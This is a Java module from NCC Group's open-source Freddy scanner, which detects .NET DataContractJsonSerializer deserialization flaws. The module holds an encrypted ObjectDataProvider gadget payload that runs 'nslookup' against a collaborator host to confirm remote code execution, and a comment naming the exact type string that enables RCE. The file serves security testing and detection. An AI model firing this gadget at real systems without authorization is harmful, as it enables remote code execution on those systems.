// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET DataContractJsonSerializer
 * API.
 *
 * Note that, like DataContractSerializer, exploitation
 * relies on control of a type parameter to the
 * DataContractJsonSerializer constructor. If this can be
 * set to the following value then RCE is possible:
 *  -> System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class DataContractJsonSerializerModule extends FreddyModuleBase {
    //ObjectDataProvider payload data
    private final String OBJD_PREFIX = decrypt("tW93zth10huB5E2bklWhiKS+dq1e4QYsRCTTkX8N8EP1EsViGez81GxSN1HFIKdhl3mly8U2H0WSoKCs7Yt95FR13o2MU98Xh1dKMtzAKHGpGgHgWDBQrIZLzcw+onbAOS27gEfJdumPWXIjMCZ/o8NGE/L3jIvIqs8r4a3sSqjC4amxZ4jKNI+BPssh6Ksw1K1OBIiJykOo/ENKHov9+I48PXIMiy80jpmoAuLShAA6wO8xmAG/3PX7naAtF51S08y+u1OrWEPVnQsxRyQsf/rY8TMulcX2GYG+4fhWBW/3j4bn39DpaeI5w21dmc10Rd0NkaK1iXKsBqk4g0Ad7A==");
    private final String OBJD_SUFFIX = decrypt("HIvdW/5p/8WusoBXU5ZGFQ==");

    protected void initialiseModule() {
        setName("DataContractJsonSerializer");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("Note that exploitation relies on control of the type parameter to the " +
                "DataContractJsonSerializer constructor.");
        setRemediationDetail("");
        setSeverity(SeverityRating.MEDIUM);

        registerPassiveScanIndicator(Pattern.compile("((\")|(%22))__type((\")|(%22))"), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("DataContractJsonSerializer.ReadObject", IndicatorTarget.RESPONSE);

        //Register false positive to avoid firing issues for JavascriptSerializer targets
        registerPassiveScanFalsePositiveIndicator(new Pattern[]{Pattern.compile("Version"), Pattern.compile("Culture"), Pattern.compile("PublicKeyToken")}, IndicatorTarget.REQUEST);

        registerActiveScanExceptionPayload("{\"__type\":\"\"}", "DataContractJsonSerializer.ReadObject");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
        }
        return null;
    }
}
